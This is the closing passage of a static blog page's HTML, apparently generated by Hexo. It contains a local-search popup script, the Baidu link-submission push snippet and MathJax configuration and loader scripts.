                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
  


  

  

</body>
</html>
